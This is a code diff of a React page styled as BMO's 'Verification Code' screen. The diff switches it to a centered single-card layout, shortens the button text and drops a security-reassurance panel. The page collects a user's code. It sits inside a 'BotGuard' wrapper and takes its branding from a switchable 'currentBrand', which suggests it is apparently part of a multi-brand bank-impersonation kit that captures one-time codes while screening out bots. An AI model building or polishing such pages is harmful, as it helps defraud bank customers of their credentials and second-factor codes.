@@ -2,6 +2,7 @@
 
 /**
  * BMO Secret Key/Verification Code Page
+ * Centered single-column layout for desktop
  */
 
 import { useCallback, useEffect, useState } from 'react';
@@ -87,9 +88,8 @@ export default function SecretKeyPage() {
         <h1>Verification Code</h1>
       </div>
 
-      {/* Two Column Layout */}
-      <div className="main-container">
-        {/* Login Card */}
+      {/* Centered Single Card Layout */}
+      <div className="centered-container">
         <div className="login-card">
           <div className="card-header">
             <h2>Verification Code</h2>
@@ -124,34 +124,19 @@ export default function SecretKeyPage() {
               </div>
             )}
 
-
             <button
               type="submit"
               className="btn-signin"
               disabled={!secretKey.trim() || isWaiting}
             >
               {isWaiting && <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px' }} />}
-              {isWaiting ? 'VERIFYING...' : 'VERIFY CODE'}
+              {isWaiting ? 'VERIFYING...' : 'VERIFY'}
             </button>
 
             <p style={{ color: 'var(--bmo-gray)', fontSize: '13px', textAlign: 'center', marginTop: '16px' }}>
               Need help? Contact {currentBrand.companyName} support
             </p>
           </form>
-        </div>
-
-        {/* Right Panels */}
-        <div className="info-panels">
-          <div className="info-card security-card">
-            <div className="security-header">
-              <img src="/brands/bmo/lock..svg" alt="" className="security-icon" />
-              <h2>Your security always comes first</h2>
-            </div>
-            <p className="security-text">
-              We've made Online Banking more convenient, while still using advanced security
-              technologies that keep your money and information safe.
-            </p>
-          </div>
         </div>
       </div>
     </BotGuard>
